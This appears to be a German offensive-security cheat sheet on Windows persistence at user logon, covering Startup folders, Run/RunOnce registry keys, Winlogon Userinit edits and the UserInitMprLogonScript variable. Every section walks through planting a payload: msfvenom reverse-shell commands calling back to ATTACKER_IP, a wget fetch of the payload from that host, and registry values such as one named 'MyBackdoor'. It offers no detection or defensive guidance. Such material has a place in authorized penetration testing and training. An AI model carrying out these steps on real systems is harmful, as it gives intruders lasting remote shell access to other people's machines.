# Persistenz über Benutzeranmeldung

{% hint style="info" %}
Bestimmte Aktionen eines Benutzers können mit der Ausführung von Schadcode (Payloads) verknüpft werden, um Persistenz zu erreichen. Windows bietet mehrere Mechanismen, um Payloads an spezifische Benutzerinteraktionen zu koppeln. In diesem Zusammenhang liegt der Fokus auf Methoden, bei denen Payloads beim **Benutzeranmeldevorgang** automatisch ausgeführt werden.
{% endhint %}

### **Startup-Ordner**

Jeder Windows-Benutzer hat einen **persönlichen Autostart-Ordner**, in dem platzierte Programme beim Login automatisch gestartet werden:

* **Benutzerbezogen:**\
  `C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
* **Für alle Benutzer:**\
  `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`

#### Beispiel:

1.  Reverse Shell erstellen:

    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
    ```
2.  Datei zur Zielmaschine übertragen (z. B. mit Python HTTP Server und `wget`):

    ```powershell
    wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
    ```
3.  Datei in den globalen Autostart-Ordner verschieben:

    ```cmd
    copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
    ```
4. **Sitzung abmelden und wieder anmelden** → Shell wird aktiv.

***

### **Registry: Run / RunOnce Keys**

Programme lassen sich auch über bestimmte Registry-Einträge beim Login automatisch starten:

* **Nur aktueller Benutzer:**\
  `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`\
  `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* **Systemweit:**\
  `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`\
  `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`

#### Beispiel:

1.  Reverse Shell generieren:

    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe
    ```
2.  Datei nach `C:\Windows` verschieben:

    ```cmd
    move revshell.exe C:\Windows
    ```
3. Registry-Eintrag unter `HKLM\...\Run` setzen:\
   Name: `MyBackdoor`, Typ: `REG_EXPAND_SZ`, Wert: `C:\Windows\revshell.exe`
4. **Abmelden und wieder anmelden** → Shell wird aktiv.

***

### **Winlogon Manipulation**

Die Komponente `Winlogon` kann manipuliert werden, um beim Login eigene Programme zu starten. Zwei Registry-Schlüssel sind relevant:

* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit`
* `HKLM\...\Winlogon\shell`

Standardwert von `Userinit`:

```
C:\Windows\system32\userinit.exe,
```

→ Payload **mit Komma hinzufügen**, nicht ersetzen.

#### Beispiel:

1. Reverse Shell erzeugen und nach `C:\Windows` verschieben.
2.  Registry-Schlüssel `Userinit` bearbeiten:\
    Neuer Wert:

    ```
    C:\Windows\system32\userinit.exe,C:\Windows\revshell.exe
    ```
3. **Abmelden und wieder anmelden** → Shell aktiv.

***

### **Logon Scripts über Umgebungsvariable**

`userinit.exe` prüft beim Login die Umgebungsvariable `UserInitMprLogonScript`. Diese kann genutzt werden, um ein **individuelles Logon-Skript** auszuführen.

* Gilt nur für den aktuellen Benutzer (kein HKLM-Äquivalent).

#### Beispiel:

1. Reverse Shell erstellen und nach `C:\Windows` kopieren.
2. Registry-Schlüssel:\
   `HKCU\Environment`\
   → Neuer Eintrag:\
   Name: `UserInitMprLogonScript`, Typ: `REG_SZ`, Wert: `C:\Windows\revshell.exe`
3. **Abmelden und wieder anmelden** → Shell wird aktiviert.
